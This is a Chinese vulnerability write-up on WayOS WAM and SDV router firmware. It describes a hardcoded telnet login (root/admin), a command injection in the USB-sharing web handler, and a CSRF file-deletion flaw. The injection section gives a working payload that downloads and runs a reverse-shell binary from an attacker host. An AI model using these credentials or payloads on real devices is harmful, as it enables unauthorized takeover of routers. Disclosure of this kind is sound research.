# 维盟wayos多款路由网关设备存在多个漏洞
> splash
> 来源：https://www.iotsec-zone.com/article/144

# wayos维盟路由器漏洞挖掘
### 漏洞信息
影响WAM_9900等多款WAM系列路由器、网关（带有USB共享功能），包括但不限于WAM系列，SDV系列，21.10.09及之前固件
### WAM_9900固件下载
[http://www.wayos.com/products/WAM9900siWANquanqianzhaodedaiw.html](http://www.wayos.com/products/WAM9900siWANquanqianzhaodedaiw.html)
## 漏洞分析
### 预置后门漏洞
使用binwalk解包，查看路由器启动文件，会自启动telnet，如果能拿到口令，就直接getshell了![0.png](https://www.iotsec-zone.com/images/MdImg/1d27ccde62ea3cc00a9d71d1ecc2ef02.png)
使用FirmAE工具仿真固件，运行成功后使用nmap扫描端口，发现开放了telnet端口
![1.png](https://www.iotsec-zone.com/images/MdImg/c51b05307b2e8583b1250cbf2b4da29f.png)
访问连接一下，查找指纹关键字

![2.png](https://www.iotsec-zone.com/images/MdImg/180012e38c0f91611ca867639acadf71.png)

    grep -r "telnet"     grep -r "WayOS"
![3.png](https://www.iotsec-zone.com/images/MdImg/7f146dfa333e4525e56e331731c364cb.png)

![4.png](https://www.iotsec-zone.com/images/MdImg/d3a25fd9e68a33329e3aee26da281b4b.png)
取并集为mqtt_ai
拖入IDA分析，搜索字符串telnet
![5.png](https://www.iotsec-zone.com/images/MdImg/3717f83b5a56b4c5443403aa13885c3f.png)
疑似telnet口令root/admin,尝试登录，成功，但在web文件中没有找到关于telnet的设置页面
![6.png](https://www.iotsec-zone.com/images/MdImg/a4a7077312bf47debf10675275f242cd.png)
这个漏洞不是影响系列所有的网关设备，部分网关设备telnet服务不会随系统启动开启
### 命令注入漏洞
在文件系统下搜索web服务器，在文件jhttd，其他系列固件中也有命名为jhttd_s，从用户输入获取usb_username和use_husername没有进行完全过滤，拼接的命令直接作为system()参数执行，引发命令注入
![7.png](https://www.iotsec-zone.com/images/MdImg/7752ea6bbb5575314a5c64df2cd03699.png)
登录管理页面，打开usb存储共享服务，提交burp抓包，修改hname为
``wget http://192.168.1.2:8000 -O /tmp/re;chmod 777 /tmp/re;/tmp/re 192.168.1.2 5555``
将payload进行url编码，本地开启一个http服务，放置编译好的反弹shell文件，监听5555端口
![8.png](https://www.iotsec-zone.com/images/MdImg/44bd71f0fe1eb54066146b1ebf95f760.jpg)
成功getshell
![9.png](https://www.iotsec-zone.com/images/MdImg/d9b5ffc539660493b8e2e84d2e700082.png)
这个漏洞影响所有带有USB共享功能的路由网关设备，最新固件和历史固件都受影响
### CSRF
继续分析jhttpd，搜索字符串usb，有一些关于USB共享功能的url，其中usb_upload.htm是等无需经过身份验证的，
![10.png](https://www.iotsec-zone.com/images/MdImg/6ff8c3bc0ed5a7a00122f8e80a92d3d3.png)
usb_upload.htm有删除文件功能，不经身份验证会失败，提示权限不足，抓包删除功能的请求，生成csrf poc
![11.png](https://www.iotsec-zone.com/images/MdImg/439ffef1ff1d77b3783b9beecd9ee946.jpg)
使用认证后的用户打开，会成功删除文件![12.png](https://www.iotsec-zone.com/images/MdImg/4d442f5d2d928046188ae3cb20f53bb9.jpg)
这个漏洞影响所有带有USB共享功能的路由网关设备，最新固件和历史固件都受影响
## 总结
总的来说挖到这几个漏洞都不是很难，需要扩展一下自己的思路和实际动手能力，以上三个漏洞均已提交CNVD，但是中高危也不给证书，emmm，其实影响的还是挺多的，几乎涵盖了所有路由网关设备，而且价格还贵。。。行吧，确实也不是高质量漏洞，毕竟很好挖。争取后边挖到一些高质量的洞，大家一起加油。
